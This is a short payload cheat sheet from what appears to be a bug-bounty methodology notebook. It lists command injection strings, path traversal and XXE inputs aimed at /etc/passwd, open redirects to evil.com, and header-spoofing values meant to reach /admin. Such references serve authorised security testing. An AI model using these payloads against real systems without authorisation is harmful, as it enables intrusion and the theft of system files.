> [!abstract] Module: [[4-Methodology/Crow-Hustler/hunter-methodology-V1/payloads/00-index|← Back to Payloads]]

# Common Payloads

## Command Injection

```
; id
| id
` id `
$(id)
```

## Path Traversal

```
../../../etc/passwd
..\..\..\windows\win.ini
%2e%2e%2f%2e%2e%2f/etc/passwd
```

## XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

## Open Redirect

```
//evil.com
https://evil.com
/\/evil.com
```

## Header Injection

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Original-URL: /admin
```
